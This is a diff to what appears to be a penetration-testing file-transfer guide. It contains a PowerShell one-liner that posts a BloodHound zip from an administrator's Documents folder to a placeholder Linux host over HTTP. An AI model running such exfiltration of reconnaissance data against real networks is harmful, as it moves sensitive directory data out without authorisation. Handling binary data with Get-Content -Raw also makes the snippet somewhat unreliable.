@@ -15,7 +15,7 @@ This starts an HTTP server on port 8000 that accepts file uploads.
 Step 3: Upload a File from Windows Using PowerShell
 ----------------------------------------------------
 Run the following PowerShell one-liner on your Windows machine, replacing the file path and Linux IP:
-    $filePath = "C:\users\administrator\documents\20241228202930_BloodHound.zip"; 
+    $filePath = "C:\\users\\administrator\\documents\\20241228202930_BloodHound.zip"; 
     $boundary = [System.Guid]::NewGuid().ToString(); 
     $body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"`r`n`r`n$(Get-Content $filePath -Raw)`r`n--$boundary--"; 
     Invoke-RestMethod -Uri "http://<linux-ip>:8000/upload" -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
